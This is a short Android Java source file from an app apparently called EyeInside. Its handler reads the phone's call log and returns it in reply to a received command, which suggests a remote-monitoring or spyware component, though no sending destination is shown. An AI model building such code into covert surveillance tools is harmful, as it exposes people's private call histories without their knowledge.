package com.code4bones.EyeInside;

import android.content.Context;
import android.database.Cursor;
import android.net.Uri;
import android.os.Handler;
import android.os.Message;
import android.provider.CallLog;


final class handleCallLog extends Handler {
	
	public long lastCall = -1;
	public Context mContext;
	public static final Uri URI = CallLog.Calls.CONTENT_URI;

	public handleCallLog(Context context) {
		mContext = context;
		lastCall = -1;
	}
	
	public void handleMessage(Message msg) {
		CommandObj command = (CommandObj)msg.obj;
		
		Cursor cur= mContext.getContentResolver().query(URI,null, 
				null, null, "_id DESC");
		if  ( cur == null || !cur.moveToFirst() ) 
			return;
		/*
		CallObj call = new CallObj(cur);
		if ( lastCall >= call.occured ) {
			cur.close();
			return;
		}
		lastCall = call.occured;
		cur.close();
		*/
		try {
			command.Reply(cur);
			cur.close();
		} catch (Exception e) {
		}
	}
}
